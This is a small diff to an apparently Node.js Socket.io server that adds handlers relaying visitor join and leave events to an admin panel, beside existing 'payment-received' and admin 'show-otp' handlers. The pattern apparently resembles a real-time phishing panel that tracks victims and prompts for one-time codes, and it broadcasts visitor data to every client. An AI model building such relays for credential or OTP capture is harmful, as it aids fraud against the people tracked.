@@ -47,6 +47,21 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('payment-received', data);
   });
 
+  // Handle visitor tracking
+  socket.on('visitor-joined', (data) => {
+    console.log('Visitor joined:', data);
+    
+    // Emit to admin panel (broadcast to all connected clients)
+    socket.broadcast.emit('visitor-joined', data);
+  });
+
+  socket.on('visitor-left', (data) => {
+    console.log('Visitor left:', data);
+    
+    // Emit to admin panel (broadcast to all connected clients)
+    socket.broadcast.emit('visitor-left', data);
+  });
+
   // Handle admin actions
   socket.on('show-otp', (data) => {
     console.log('Admin requested OTP:', data);
